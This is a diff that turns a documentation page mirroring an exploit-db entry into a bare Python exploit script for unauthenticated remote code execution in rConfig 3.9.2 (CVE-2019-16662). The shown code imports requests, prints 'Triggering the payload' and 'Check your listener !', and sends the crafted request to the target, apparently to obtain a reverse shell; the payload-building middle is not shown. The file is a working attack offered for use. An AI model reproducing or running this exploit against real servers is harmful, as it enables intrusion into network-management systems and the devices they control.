@@ -1,36 +1,13 @@
----
-description: 'https://awesome.hackpuntes.com/exploit-db/rconfig-3.9.2-remote-code-execution'
----
+#!/usr/bin/python
 
-# rConfig 3.9.2 - Remote Code Execution
-
-{% embed url="https://www.exploit-db.com/exploits/47555" %}
-
-### FILES
-
-{% file src="../.gitbook/assets/rconfig-3.9.2.zip" caption="Vulnerable software" %}
-
-{% file src="../.gitbook/assets/rconfig-preauth.txt" caption="Exploit PreAuth" %}
-
-{% file src="../.gitbook/assets/rconfig-postauth.txt" caption="Exploit PostAuth" %}
-
-### POC
-
-{% embed url="https://www.youtube.com/watch?v=uZbh-j5HvO4" %}
-
-### ORIGINAL
-
-```text
-# Exploit Title: rConfig 3.9.2 - Remote Code Execution
-# Date: 2019-09-18
-# Exploit Author: Askar
+# Exploit Title: rConfig v3.9.2 unauthenticated Remote Code Execution
+# Date: 18/09/2019
+# Exploit Author: Askar (@mohammadaskar2)
+# CVE : CVE-2019-16662
 # Vendor Homepage: https://rconfig.com/
 # Software link: https://rconfig.com/download
 # Version: v3.9.2
 # Tested on: CentOS 7.7 / PHP 7.2.22
-# CVE : CVE-2019-16662
-
-#!/usr/bin/python
 
 import requests
 import sys
@@ -65,8 +42,3 @@ print "[+] Triggering the payload"
 print "[+] Check your listener !"
 
 requests.get(url_to_send, verify=False)
-
-
-rConfig-preauth.png
-```
-
